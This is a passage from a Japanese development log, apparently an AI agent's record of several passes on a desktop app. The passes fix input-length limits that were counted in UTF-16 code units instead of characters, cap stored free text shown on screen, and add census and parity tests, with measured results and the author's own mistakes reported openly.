か所**で全部ローカル (入力欄の値・純関数の評価・長さの判定) ② `hydroponics-setup` は経営サマリー経由で金融機関等提出用の書面に載るが、それは**利用者が紙を作って出す**行為であり、アプリが送るのではない ③ `connector-output.payload` は `any` なので形の上は何でも入るが、今日の入力は `ConnectorsPage` の**ハードコードされた見本**だけである (理由つきで台帳へ)。`typecheck` 緑・`npm test` **841 / 18,424**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15386 → **15395** へ —— **今回も予想せず門に訊いた**)**)・— **2026-09-23 パス 422 後の計測: 11,946,991 B / 3,359,510 B (両方 −1 B** —— 入口 6 か所を `.length` から `moreThanChars` へ替え、裸の 64 に名前を付けた分。**減るのは、最小化後の識別子が `.length>C` とほぼ同じ長さで、`kpiActuals` が落とした字面の分だけ勝ったため。** **入口が「N 文字まで」と述べながら、コード単位で数えていた。** **見つけ方**: パス 421 で `connector-output` を測るために `overviewOverrides.ts` を読み、その隣の行が `label.length > CUSTOM_METRIC_MAX_LABEL` であることに気付いた。実測 (2026-09-23 · 直す前 · 標本は絵文字 = **1 文字 / 2 コード単位**):

| 入口 | 文面が名乗る天井 | 実際に断り始める所 |
| --- | ---: | ---: |
| 事業名 (`businessUnits`) | **60 文字** | **31 文字** |
| 区分 (同) | **30 文字** | **16 文字** |
| メモ (同) | **200 文字** | 101 文字 |
| 項目名 (`overviewOverrides`) | **40 文字** | **21 文字** |
| メモ (同) | **200 文字** | 101 文字 |
| 事業名 (`kpiActuals`) | **1〜64 文字** | **33 文字** |

★ **文面が、その文面を読む利用者に対して証明可能に偽である** —— 31 文字を打った人が「事業名は 60 文字までです。」と断られる。**画面はその人の入力を数えて答えているはずなのに、答えが自分の主張と矛盾している。** ★ **しかも出口と食い違っていた** —— パス 419 は同じ 5 つの定数を `displayField` に通したが、`clampToCeiling` は `for (const ch of value)` で**文字**を数える。つまり**入口はコード単位・出口は文字**で、パス 359 の「入口が出口より厳しい」の別の現れである。★ **既存の境界の検査は全部緑だった** —— 標本が BMP の文字 (`あ`) だと 1 文字 = 1 コード単位なので**この欠陥は見えない**。★ **`ceilingUnitCensus` (パス 195 / 196) が見なかった理由は綴り** —— 針は `MAX_*_CHARS` を探すが、この 6 つは `X_MAX` (`BUSINESS_NAME_MAX`)・`MAX_X_LABEL` (`CUSTOM_METRIC_MAX_LABEL`)・**裸の 64** で、どれも母集団から落ちる。パス 419 が「天井の定数には綴りが 3 通りある」と残した当のことで、**このリポジトリが 6 度目に踏んだ「綴りの針は、綴りでない物に動かされる」**である。**直し**: ① 6 か所を `moreThanChars` へ (**正当な値の答えは 1 つも変わらない** —— BMP の文字しか打たない利用者には差が出ない・実測) ② 裸の 64 に名前 (`MAX_KPI_UNIT_CHARS`) を付け、**上の名前の走査も同時に覆う** (パス 196 と同じ直し方で、**新しい規則を足さずに済む**) ③ **2 本目の錨を足した** —— `DECLARED_UNIT` は名前ではなく**その場の文面が名乗る単位**で拾う: 「`${CONST} 文字`」または「`64 文字`」と述べる文の近くで、その同じ天井を `.length` で比べていたら鳴る。**綴りがどうであれ、アプリが利用者に約束した単位で数えているかだけを見る。** 台帳は**両方向で今日 0 件**、床は**文面と比較が揃っている 14 件**(空の「0 件」が自明に真にならないため)。④ **振る舞いの背骨** (`renderer/data/__tests__/declaredCharUnitBehaviour.test.ts` · **8 件**) —— 実物の 6 つの入口を絵文字で境界ちょうどまで埋め、通ること・+1 で断ること・**断りの文が名乗る数が境界と一致すること**を見る (走査は*書き方*を探すが、**利用者が見るのは答えである**)。対照 **9 方向すべて鳴り、A〜F は 2 つの錨 (振る舞い + 走査) の両方で鳴る** (A 事業名 ❌2 / B 区分 ❌2 / C 事業メモ ❌2 / D 項目名 ❌2 / E 任意項目メモ ❌2 / F KPI 事業名を裸の 64 へ ❌2 / G 針の窓を 1 行へ ❌1 (**床が鳴る**) / H 文面の判定を常に false ❌2 / I 台帳に鳴らない行を足す ❌1・復帰後 ❌0)。★ **測って何も無かった軸も記録する**: ① **バイトを名乗る天井** —— 「バイト / MB」の近くで `.length` を比べる **6 件はすべて偽陽性** (配列の件数 4・非空の判定 1・`MAX_MEMBER_EMAIL_LEN` は台帳が「オクテットが正しい」と理由つきで述べている当のもの) ② **`maxLength`** —— 注記を落とすと実コードは **1 件だけ**で、それは 16 進の色 (`#RRGGBB` · ASCII のみ) なので単位の食い違いが起こりえない (パス 197 が他を全部外していた) ③ 「N 桁」「N 個まで」を名乗る近くの `.length` は **0 件**。`typecheck` 緑・`npm test` **840 / 18,415**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15381 → **15386** へ —— **今回も予想せず門に訊いた**)**)・— **2026-09-23 パス 421 後の計測: 11,946,992 B / 3,359,511 B (両方 +4 B** —— 画面の断り 1 文で保管値の id を `cropIdText` に通した分だけ (漏斗はパス 420 で既に束に在る)。**パス 419 / 420 の針がどちらも見なかった欄が 1 つ残っていた。** **見つけ方**: パス 420 の直しを書いた画面の**隣の画面**を読んだ —— `OverviewPage` の水耕栽培の枠は、保存した設定の品目が一覧に無いとき「保存した設定の品目「{current.cropId}」は一覧にありません。」と**素で**刷っていた。実測 (2026-09-23 · 1 欄 200,000 字を実物の保管層へ入れて実物の画面を描く):

| 画面 | 素 | `hydroponics-setup.cropId` に 200,000 字 |
| --- | ---: | ---: |
| `overview` (水耕栽培の枠) | 10,033 | **210,534** |

★ **この欄は 2 つの針のどちらにも掛からなかった** —— パス 419 は**入口の天井の定数**から母集団を引いたが `cropId` の入口は天井を宣言していない (`<select>` で選ぶので長さの上限を書く動機が無い)。パス 420 は**画面に出る自由文**から引いたが、この値は一覧にも表にも出ず、**「参照が解決できなかったときの 1 文」の中にだけ**現れる。**3 パス続けて針が違い、3 回とも前の針では見えなかった。** ★ **だから今回は家系そのものを数える機械を置いた** —— `renderer/data/__tests__/referenceFieldCensus.test.ts` (**6 件**) が、**母集団を形の表から引く** (`COLLECTION_SHAPES[*].fields` —— パス 130 が個人情報の走査のために足した runtime の欄名 —— を `*Id` / `*Ids` で濾す) ので、参照の欄が増えた日に「種類と理由を書け」と鳴る。行は 4 つの種類のどれかを名乗る: `entrance-checked` (入口が参照先と同じ形を要求する) / `resolved-not-printed` (解決した先しか刷らない) / `printed-with-ceiling` (id が文へ入るので天井を通す) / `write-only` (読み戻す画面が 1 つも無い)。★ **最初に書いた版は、この検査自身が偽の主張を持っていた** —— docblock は「両方向」と述べながら `referenceFields()` は**台帳をそのまま返しており、母集団を 1 度も引いていなかった** (書いた本人が、書いたその場で `mention-vs-declaration` を踏んだ)。**引き直したら 7 件出て、台帳に無い 1 件が在った** —— `connector-output.connectorId` である。★ **その 1 件を測ったら別のことが分かった** —— `connector-output` は **読み戻す画面が 1 つも無い** (`CONNECTOR_OUTPUT_COLLECTION` の読みは 0 件)。`ConnectorsPage` が刷る `s.connectorId` は `resolveHookPlan` が組んだ**手順**の欄で、保管値ではない。唯一この collection に触る逃げ口 (点検パネル) が刷るのは **collection の名前と件数だけ** (`summarizeMalformed`) なので、長い id でも逃げ口は開いたままである (法則 `escape-hatch-stays-open`)。★ **針の死角も測って書いた** —— 針は綴り (`*Id`) なので id を指すのにそう綴られていない欄は映らない。実測した 2 件はどちらも安全だった: `manual-overrides.path` は**固定の目録**に対する引きの鍵で (目録に無い path の行は画面に 1 行も出ない)、`manual-metrics.scope` は絞り込みの述語で、**どちらも刷らない**。★ **正当な値の答えは 1 つも変わらない** —— 品目 id は `CROP_ID_RE` で 40 字までなので、天井 40 字は**正当な値を 1 つも切らない** (検査は写しを作らず**参照先の式そのもの**でそれを確かめる)。対照 **8 方向すべて鳴り、それぞれ狙った検査に当たる** (A 断りの文を素へ戻す ❌1 / B 参照の形の門を外す ❌1 / C `cropIdText` の天井を外す ❌3 / D 台帳から参照の行を 1 つ消す ❌2 (**両方向とも**) / E 理由を床より短くする ❌1 / F 台帳から `write-only` の行を消す ❌2 / G 針を殺して母集団を空に ❌2 (**床が鳴る**) / H `batchIdText` の天井を外す ❌2・復帰後 ❌0)。★ **自戒: 対照が 3 つ「鳴らなかった」が、3 つとも当てていなかっただけだった** —— C は錠の字面が実物と違い (`id: unknown` ではなく `id: string`) **置換が 1 度も起きず** (`count=0` と自分の script が言った)、E は型を足す形にしたので **vitest が型を剥がして素通りし**、F はブロック注記で配列を壊したので**検査ファイルごと読み込みに失敗した** (`Test Files 22` = 別ファイルだけが走った ——「検査が 0 件」は緑ではない · パス 412)。3 つとも当て直して鳴らせた。**「落ちなかった」と「当てていなかった」を混ぜない** (パス 397 / 399 / 403 / 420 に続く **5 度目**)。★ **ゲートが 1 つ捕まえた**: `lint:shared-judgement` の census —— `hydroponicsControl` の renderer 側の読み手が 5 → 6 になった。**判定は今も正しい** (実測: main が import するのは `buildHydroponicsSnapshot` と型 2 つだけ・否定で答える 7 つの消費者は今も `hydroponicsLog.ts` / `HydroponicsPage.tsx` の 2 本だけで、`OverviewPage.tsx` が読む `cropIdText` は `null` を返さないのでその 7 つに入らない) が、**理由の散文が名前を並べていたので「左の数」と食い違って読めた** —— パス 419 とまったく同じ形なので、**どの数が何を数えているか**を書き足した。`typecheck` 緑・`npm test` **839 / 18,404**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15375 → **15381** へ —— **今回も予想せず門に訊いた**。1 度目は 15379 と答え、検査を 2 件足したあと 15381 と答えた)**)・— **2026-09-23 パス 420 後の計測: 11,946,988 B / 3,359,507 B (両方 +242 B** —— 保管値の id を文へ入れる天井 2 つ (`batchIdText` / `cropIdText`) と、相談テーマ・品目 id の 2 つの数に名前を付けた分。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**パス 419 の母集団は「入口の天井の定数」から引いた。その裏返しを `COLLECTION_SHAPES` の側から数え直した。** 23 collection の文字列の欄を全部並べ、実物の保管層へ入れて実物の画面を描く。実測 (2026-09-23 · 直す前 → 直した後):

| 欄 | 直す前 | 直した後 |
| --- | ---: | ---: |
| `shigyo-consultations.topic` | **201,933 字** | 2,014 |
| `hydroponics-batches.id` | **601,354** (3 か所に出る) | 1,477 |
| `hydroponics-batches.cropId` | **401,346** (2 か所) | 1,428 |

★ **いちばん重い `cropId` は、天井の話ではなかった** —— `parseBatch` は「文字列で空でない」しか見ておらず、実測で `'x'.repeat(200)` / `'A B/C'` / `'../../evil'` が**すべて通った**。ところが `cropId` が**指す先**の品目 id は `CROP_ID_RE` (`^[a-z0-9][a-z0-9-]{0,39}$`) にしか成り得ず、`sanitizeCropList` が同じ式で選別する。**参照が参照先より緩い**形で、パス 359 の「入口が出口より厳しい」の**別の軸**である (あちらは同じ欄の入口と出口、こちらは 2 つの欄の間)。**画面から入る値の答えは 1 つも変わらない** —— 入力は品目一覧の `<select>` で、既定の 5 件は実測で最長 13 字、利用者が足す id も `custom-<n>` である。★ **ロット名は入口が 40 字で断るのに、理由の文が生の保存値を刷っていた** —— `dailyTasks` の `why` (「ロット X の品目 "Y" が一覧にありません」) はパス 320 が teamradar について閉じたのと**同じ家系**で、復元で入った行はその入口を通らない。理由の文を組むのは `shared/hydroponicsControl.ts` なので、**天井もそこへ移した** (`MAX_BATCH_ID_CHARS` を renderer から shared へ・renderer は別名で再輸出し、**数は 1 つだけ**)。★ **相談テーマの 80 は関門の式の中の裸の数だった** —— 名前が無いので表示側が引けず、それが 200,000 字の相談テーマが一覧に出ていた元である。`MAX_CONSULTATION_TOPIC_CHARS` として名前を付け、入口は `moreThanChars` (**文字**で数える)・表示は `displayField` で**同じ数を読む**。★ **`CROP_ID_RE` の長さも定数から組む** (`MAX_CROP_ID_CHARS = 40`) —— それまで長さは正規表現の `{0,39}` の中にだけ在り、名前を持たないので他所から引けなかった。**測って何も無かった軸も記録する**: ① **`bank-submission-settings` の `profile.representative` / `.address` は既に安全** —— `settingsFromRecord` が**読み取り時に同じ `parseSubmissionProfile`** を通すので、入口の 100 字が復元にも掛かる (**入口と出口が同じ関門** —— これがこの家系の正しい形で、他の 18 欄がそうでないことの対照になる) ② `hydroponics-readings.note` / `.batchId` / `hydroponics-batches.note` は**画面に出ない** (実測で 200,000 字が 1 文字も届かない)。**出さない面に天井は要らない** ③ `overview-overrides` / `overview-custom-metrics` は**どの画面も購読していない** (形の表と collection 名の定数だけが参照する)。検査はパス 419 の機械を **18 → 21 件**へ広げ (同じ不変条件・同じ harness)、`hydroponicsControl.test.ts` に **4 件**・`hydroponicsLog.test.ts` に **1 件** (参照の形) を足し、`shigyoDirectory.test.ts` の既存の境界の検査を**定数を読む形 + 単位の主張**へ直した。★ **錠を別の欄に置けない collection には、健全な 2 行目を置く** —— 相談は自由文が `topic` しか無く、ロットは `note` が画面に出ないので、同じ行の別の欄を錠にできない。対照 **9 方向すべて鳴り、それぞれ狙った検査に当たる** (A 相談テーマの表示を素へ ❌1 / B ロット名の表示を素へ ❌1 / C 品目 id の表示を素へ ❌1 / D 作業リストの理由を素へ ❌3 / E 参照の形の門を外す ❌1 / F 入口の 80 を天井なしへ ❌1 / G `CROP_ID_RE` を天井から組まない ❌1 / H 台帳から 1 行消す ❌1 / I 入口を符号単位で数える ❌1・復帰後 ❌0)。★ **自戒: 対照 F が 1 度目に鳴らず、私はそれを「検査が無い」と読んだ。偽だった** —— `shigyoDirectory.test.ts` に境界の検査は**最初から在り**、私がその**ファイルを対照の実行対象に入れていなかった**だけである。危うく重複した `it` を足す所だった (統合した)。**「落ちなかった」と「当てていなかった」を混ぜない** —— パス 397 / 399 / 403 と同じ形で **4 度目**である。★ **ゲートが 2 つ捕まえた**: ① **パス 399 の `mutateScopeCensus`** —— 台帳の理由が名乗る行数 (1,390) が実物 (1,417) とずれたので落ちた。**設計どおりに働いた** (「数は機械が持ち、判断は散文が持つ」) ② `lint:shared-judgement` —— `hydroponicCrops` の renderer 側の読み手が 3 → 4 になった。**理由の散文は main の側について述べており今も正しい**ので、`cropIdText` / `MAX_CROP_ID_CHARS` の `src/main/` からの参照が **0 件**であることを実測して書き足した。★ **自戒 2: コンテナが全件テストの最中に落ちた** (exit 137 → 再起動)。背景の待ちが全部消えて外からは無音に見えた —— 作業ファイルは無傷なので回し直した。`typecheck` 緑・`npm test` **838 / 18,397**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15370 → **15375** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 229 ms / heap 10.3 MB・FULL DCL 606 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **21 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 419 後の計測: 11,946,746 B / 3,359,265 B (両方 +218 B** —— 保管した自由文を画面へ出す **15 欄**に天井を通した分 (`displayField` の呼び出しと入口の定数の import だけで、**新しい数は 1 つも作っていない**)。`renderer/` は両ビルドが読むので LITE も同じだけ増える。**入口が上限を宣言している 15 欄が、画面では天井なしに描かれていた。** **見つけ方**: パス 417 は販売記録のメモについてこれを閉じた。**同じ非対称が他に在るか**を、入口の関門の定数から辿った。実測 (2026-09-23 · 1 欄 200,000 字を実物の保管層へ入れて実物の画面を描く):

| 画面 | 素 | 1 欄 200,000 字 |
| --- | ---: | ---: |
| `team` | 441 | **200,442** |
| `tax-accountant` (士業 CRM) | 1,909 | **201,954** |
| `mutual-funds` | 2,258 | **202,369** |
| `real-estate` | 4,780 | **204,896** |
| **`ManualDataSection`** (`App.tsx` が目録を持つ全画面に描く) | 214 | **400,229** |

★ **いちばん重いのは 5 つ目で、しかも私の針が狭かったせいで 1 度目に見えなかった** —— 入口の定数を `MAX_*_CHARS` で探したので、`BUSINESS_NAME_MAX` / `BUSINESS_CATEGORY_MAX` / `BUSINESS_NOTE_MAX` / `CUSTOM_METRIC_MAX_LABEL` / `CUSTOM_METRIC_MAX_NOTE` という **`*_MAX` と名乗る 5 つ**が母集団から落ちていた (パス 334 / 369 / 375 / 411 / 412 と同じ家系: **綴りの針は、綴りでない物に動かされる**)。この面は**部品**なので `SERVICES` からも引けず、`App.tsx` が描くため**画面を単独で mount する harness には見えない** (パス 382 / 417 が「測れていない」と残していた当のもの)。★ **`business-units.name` が 400,229 字になるのは、同じ欄が 2 か所に出るから** —— 一覧の行と、任意項目フォームの `<option>`。**欄ごとではなく出現ごとに通す**必要が在り、対照 J (2 か所目だけ素へ戻す) がその 1 件で鳴る。★ **投げる画面は 0** —— 値は文字列のままなので、起きるのは「画面が使えなくなる」側である (パス 417 の `note` は**非文字列で投げて**いたので、そちらより軽い)。★ **フォームからは入らない (測った)** —— 200,000 字の氏名・電話・メールは入口が断る。届く道は**復元だけ**で、`COLLECTION_SHAPES` の `str` は**長さを見ない** (実測: 15 欄すべてで 200,000 字の行が `hasCollectionShape` を通る)。パス 359 の「**入口が出口より厳しい**」の、いちばん規模の大きい現れである。★ **形の側では断らない** —— `collectionShapes.ts` 自身が「**落とし過ぎは復元の欠落 = 別の事故になる**」と書いており、1 欄が長いだけで行ごと捨てると利用者はその行を失う。だから天井は**表示**に置く。★ **天井の数は 1 つも新しく作っていない** —— 15 欄すべて入口が既に宣言していた (64 / 254 / 80 / 20 / 16 / 60 / 30 / 200 / 40)。**正当な値の答えは 1 つも変わらない** (`displayField` は非文字列を `''`・天井内の文字列をそのまま返すので、`?? ''` / `|| '—'` と同じ振る舞い)。検査は `renderer/pages/__tests__/storedFreeTextCeiling.test.ts` (**18 件**) で、背骨は**振る舞い** —— 実物の保管層へ入れて実物の画面を描き、総文字数が 20,000 未満であることと**切ったことを `…` で述べる**ことを見る。台帳の `max` は**入口の定数を読む** (写しなら入口を変えた日に画面だけ古びる)。対照 **11 方向すべて鳴り、それぞれ狙った検査に当たる** (A team を素へ ❌2 / B 士業を素へ ❌4 / C 投資信託を素へ ❌2 / D 不動産を素へ ❌2 / E `…` を述べない ❌10 / F 台帳から 1 行消す ❌1 / G 入口の数を広げる ❌2 / H 錠を対象の欄に重ねる ❌4 / I ManualDataSection を素へ ❌5 / J **`<option>` の 2 か所目だけ素へ ❌1** / K **畳まれたまま測る ❌5** ・復帰後 ❌0)。★ **K が錠そのものの対照である** —— `ManualDataSection` は既定で畳まれており (`useState(false)`)、開かずに測ると **214 字**しか出ないので「行が無い状態を測って緑」になる。開く段を外すと 5 件が 5,026ms で時間切れになり、**錠が効いていることが失敗の形で分かる**。★ **錠の置き先で 3 度目の罠を踏んだ** —— 最初の錠は `'ファンド'` で、それは**フォームのラベル**「ファンド名」の部分文字列なので行が届く前から出ている (パス 376 / 417 と同じ形)。試験対象と別の欄に置いた印 (`QQLOCKQQ`) にした。★ **自戒: 対照の復帰 script が別のファイルを壊した** —— 控えを**basename で**引いていたので、`ceilingUnitCensus.test.ts` が `shared/` と `renderer/` に 1 つずつ在ることに気付かず、**shared の側を renderer の内容で上書きした** (`os.walk` が先に見つけた方で `break` していた)。git から戻せたのは**そのファイルに私の未コミットの作業が無かったから**で、パス 418 の「新しいファイルは `git checkout --` で戻らない」の裏返しの失敗である。**控えは経路で引く。** ★ **ゲートが 2 つ捕まえた**: ① `ceilingUnitCensus` —— メールの上限に `_CHARS` を付けたので「文字で数えろ」と正しく鳴った。**RFC 5321 の 254 はオクテット**なので `_LEN` へ改名し、理由つきで `UNIT_LEDGER` へ登録した (**向きが大事**: 文字で数えるのは厳しすぎるのではなく**緩すぎる** —— 絵文字 1 字は UTF-8 で 4 オクテット) ② `lint:shared-judgement` の census —— `displayField` の renderer 側の読み手が 4 → 9 になり、**理由の散文が名前を並べていたので偽になった**。判定 (「`displayField` は `null` を返さないので割れない」) は変わらないので、**名前の一覧を消して「数は左の列が数える」と書き直した**。`typecheck` 緑・`npm test` **838 / 18,389**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15367 → **15370** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 223 ms / heap 10.3 MB・FULL DCL 565 ms / heap 37.1 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **20 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 418 後も 11,946,528 B / 3,359,047 B で byte 単位で不変 (md5 も同一)** —— 直したのは `scripts/` 2 本と `__tests__/` 2 本だけ。**両方を組んで md5 まで見た** (パス 415 で「size が同じ」と「同じ物」は別だと実測したので)。**走査の道具の写しが 3 つだと思っていたら 4 つで、4 つ目だけ契約が違った。** **見つけ方**: パス 417 が残した残作業 (`stripNonCode` の `.cjs` の写し 2 つ) を閉じに行き、母集団を**走査で導いたら台帳と合わなかった** —— **自分で書いた両方向の台帳が、書いたその場で私の前提を 1 つ落とした**。4 つ目は `src/shared/__tests__/timestampPrintCensus.test.ts` の私有の写しで、**中身は落とすが引用符そのものは残す**という別の契約を持つ (パス 188 が「字面の境界が消えると `new Date('x').getHours()` のような形が**繋がって見える**」と実測して付けた理由)。★ **私は「消費者」と「実装」を数え違えていた** ——名前で grep すると**自分の宣言を持つファイルが消費者に見える**ので、パス 417 の記録の「消費者 6 本」はこの 4 つ目を消費者として数えていた (訂正した)。★ **3 つの死角はどれも今日の判定を変えない (測ってから直した)**:

| 写し | 死角 | 今日の判定への影響 |
| --- | --- | --- |
| `lint-test-coverage.cjs` | 補間を落とす | **無し** (DOM の語が補間の中だけに出る検査ファイルは **0 本**) |
| `lint-collection-time-tests.cjs` | 同 | **無し** (ゲートの出力を before / after で diff して **1 行も差が無い**) |
| `timestampPrintCensus.test.ts` | 同 | **無し** —— `Date` の読み出しが補間の中に在る所は `src` に **66 件**あり全部見えていなかったが、`Date` 形は **2 件**だけで (`RealtimeTicker.clock` / `backup.exportedAtLabel`) **どちらも `parseTimestamp(...) === null` を先に見ている** |

★ **つまり 3 つとも罠であって生きた欠陥ではない** —— それでも閉じたのは、**`.ts` の側で「この死角は実物を隠す」ことがパス 417 で既に実測された**からである (法則 `copy-pinned-by-parity`)。**直し**: ① 共有の `stripNonCode` に `keepQuoteChars` を足し、**4 つ目の写しを消して**そこへ寄せた (4 → 3) ② `.cjs` 2 つへ同じ走査器を移植 (`.cjs` は `.ts` を require できないので写しは残る —— 前例は `scripts/inject-pwa.cjs` の色の正規表現・パス 363) ③ `lint-test-coverage.cjs` に `require.main === module` の門 ——**それまで `process.exit(main(...))` が読み込みの時点で走り、require すると検査プロセスごと落ちた** (だからパリティ検査が書けなかった) ④ `shared/__tests__/stripNonCodeParity.test.ts` (**15 件**) が同じ標本 **11 種**を 3 つに**両方のモードで**通し、母集団は走査で導いて台帳と**両方向**。★ **標本の先頭はパス 417 の死角そのもの** (補間の中の呼び出し) で、残りは行番号の保存・入れ子のテンプレート・エスケープ・両方の引用符・注記という、3 つが食い違いうる軸である。対照 **5 方向すべて鳴り、それぞれ狙った検査に当たる** (A `.cjs` の 1 つを古い形へ ❌4 / B もう 1 つで区切りの空白をやめる ❌4 / C `keepQuoteChars` を効かなくする ❌8 (**引用符の標本まで鳴る = 引数が両方向に効いている**) / D 4 つ目の写しを復活 ❌1 (**台帳が増えた側で鳴る**) / E 台帳から 1 行消す ❌2・復帰後 ❌0)。★ **自戒: 対照 E の復帰に失敗した** —— パリティ検査は**まだ追跡されていない新しいファイル**なので `git checkout --` が効かず (`did not match any file(s) known to git`)、消した台帳の行が戻らなかった。手で書き戻した。**新しいファイルを対照で壊すなら、git ではなく自分で控える。** ★ **ゲートが 1 つ捕まえた**: `eslint` が私の足した `eslint-disable` 2 行を「**不要な抑止**」として鳴らした (`require` は検査ファイルでは許されている)。**抑止を予防的に書くと、抑止そのものが嘘になる。** `typecheck` 緑・`npm test` **837 / 18,371**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15363 → **15367** へ —— **今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・**2026-09-23 パス 417 後の計測: 11,946,528 B / 3,359,047 B (両方 +89 B** —— メモを型から読む漏斗 1 つと、画面に出す 3 か所の天井の分。`renderer/data/` と `renderer/pages/` は両ビルドが読むので LITE も同じだけ増える。**保管した販売記録のメモが非文字列だと、売上集計と経営サマリーが両方投げていた。** **見つけ方**: パス 416 の残作業 (「store から壊れた数が来るか」) を測ろうとして、パス 360 の機械の `wrongTypedRow` が**最初に拒まれた 1 欄しか壊さない**ことに気付いた ——`sales-entries` の欄の並びは `date / channel / amount / orders / note` なので、返るのは常に`{ date: 'bad' }` で **`note` には 1 度も当たっていなかった**。台帳が空なのは「投げる画面が無い」ではなく「**当てていなかった**」である。実測 (2026-09-23 · 直す前・**正しい日付**を持つ行 1 件):

| 壊し方 | 売上集計 | 経営サマリー |
| --- | --- | --- |
| `note: 42` / `{z:1}` / `[1]` / `true` | **4 形とも投げる** | **4 形とも投げる** |
| `note` が 200,000 字 | **画面 200,257 字** | 10,692 字 |

★ **投げていたのは `(e.note ?? '').trim()` の 3 つの写し** (`salesOrderRef` / `duplicateOrderMessage` / `salesRowKey`) —— `??` は null / undefined しか受けない。投げると `PageErrorBoundary` が受けるので**その画面は開けず、開けないのでその画面からは消せない** (逃げ口は設定の点検パネルだけになる · 法則 `escape-hatch-stays-open`)。`COLLECTION_SHAPES` の `note: opt(str)` は**入口**で型を見るが、`store.list()` は`cur.value as StoredRecord<T>` で何も検めない (パス 360 の設計 —— 読みで落とすと壊れた行がUI から触れなくなる) ので、復元・古い版・別の道具が入れた行がそのまま届く。★ **長さの側は紙にも届いていた** (実測・200,000 字のメモ 2 件): **金融機関等提出用の書面 §2 の但し書き 200,056 字**・Shopify の断りの文 200,112 字・売上集計の警告 200,076 字。**直し**: ① 読み手は `salesNoteText` **1 つ** (型から始め、trim する) ② **天井は画面に出す 3 か所だけ** (`listOrderGroups` は画面の断りと書面の但し書きが同じここを読む・`duplicateOrderMessage`・一覧のメモ欄) で、**同一性の側には通さない** —— `salesOrderRef` は注文の同一性を、`salesRowKey` は行の内容の同一性を決めるので、切った値は**別の物を指す** (パス 414 の「URL の欄には天井を通さない」と同じ理由) ③ 天井の数は**入口が既に持っていた 200** (`MAX_SALES_NOTE_CHARS`) なので**正当な値は 1 つも変わらない**。★ **3 つ目: 画面の断りが、合計に入っていない行を「2 度数えた」と言っていた** —— `overview.ts:416` は 2026-09-22 (パス 400) から `findDuplicateOrders(readableSales)` と部分集合から数え、その行に理由まで書いているのに、**売上集計の画面だけが素の購読**だった (しかも `readableSalesRows` を**すぐ上の行で計算していた**)。実測 (同じ注文名 2 件・片方の日付が`2026-02-31`): 画面は「売上高と受注件数に **2 度数えられています**」と言うのに**総売上は 1,000,000** で倍になっていない (法則 `one-subset-per-answer`)。★ **4 つ目 —— 検出の機械そのものに死角が在った。** 私の綴りの針が `salesRowKey` を**数えなかった** (4 か所のうち 3 しか見えない)。原因は `stripNonCode` が**テンプレートリテラルを補間ごと落としていた**こと —— `` `…|${salesNoteText(e)}` `` は丸ごと消える。**このリポジトリは利用者に見せる文をテンプレートで組む**ので、そこは「散文」ではなく**最も危ない式が並ぶ場所**である。しかも針は**両方向に盲目**で、素の読みへ戻してもその行は映らない。補間は文字列ではなく**式**なので `${` で code へ戻る形に直した (入れ子に耐えるよう戻り先を積み、区切りに空白を出す —— `` `a${x}b${y}` `` の `x` と `y` が地続きになると実物に無い綴りを掴む)。★ **直した針が即座に 1 件見つけた —— それは私自身の編集だった**: `ceilingUnitCensus` が`sales.ts:122` の `note.length > MAX_SALES_NOTE_CHARS` を捕まえた。名前が `_CHARS` なのに**コード単位で数えていた** (パス 252 の当の欠陥) —— `.length` だと絵文字 101 個 (= 101 文字 / 202 コード単位) を「200 文字を超えた」と断り、**自分の文面と矛盾する**。`moreThanChars` へ替えると天井を掛ける `displayField` (文字で数える) と入口の答えが揃う。検査は `renderer/pages/__tests__/storedNoteReads.test.ts` (**15 件**) で、背骨は**振る舞い** ——実物の保管層へ入れて実物の画面を描く。対照 **8 方向すべて鳴り、それぞれ狙った検査に当たる** (A 漏斗を素へ ❌9 / B `salesRowKey` を補間の中で素へ ❌1 (**旧 strip では見えなかった行**) / C 断りの天井を外す ❌1 / D 画面のメモ欄の天井を外す ❌2 / E 同一性の側に天井を通す ❌1 / F 画面を素の購読へ戻す ❌1 / G strip を補間ごと落とす形へ戻す ❌1 / H 入口を `.length` へ ❌1・復帰後 ❌0)。★ **対照が私の機械の欠陥を 1 つ捕まえた** —— 対照 A が 8 件ではなく **4 件**しか鳴らず、調べると経営サマリーの錠が**見出し** (`経営サマリー`) で、保管層より先に出るので**空の状態を測っていた**。錠を金額 (`￥1,000`) へ移すと 9 件鳴る。パス 376 で「ラベルは先に出て、算定された値は後から来る」と自分で書いた当のことである。★ **正直に言う: パス 360 の機械を 4 家系へ広げたが、それでもこの欠陥は捕まえない (対照で測った)** ——`allFieldsRow` は `date` も壊すので `readableSalesRows` が読む前に行を落とす。**「正しい日付 + 1 欄だけ壊れている」という一番現実的な形がどの家系にも無い。** 欄ごとに 1 つずつ壊す走査は**281 通り × 76 画面 = 21,356 回の描画**で `npm test` には置けないので、走らせ方と結果を`docs/REMAINING_WORK.md` に残した (実測・直した後で**投げた画面は 0**)。**閉じていない物 (測った)**: ① `stripNonCode` は**写しが 3 つ**在り (`.ts` 1 + `.cjs` 2)、台帳もパリティ検査も無い。`.cjs` の 2 つは直していない —— `lint-test-coverage.cjs` の死角は**今日 0 件**と実測した (DOM の語が補間の中だけに出る検査ファイルは 0 本) ② 保管層から読んだ文字列に天井が無い所は `note` 以外にも在りうる (今回の母集団は販売記録だけ)。`typecheck` 緑・`npm test` **836 / 18,356**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15356 → **15363** へ —— **今回も予想せず門に訊いた**)。★ **ゲートが 2 つ捕まえた**: ① `ceilingUnitCensus` (上記) ② `lint:shared-judgement` ——`apiResponse` の renderer 側 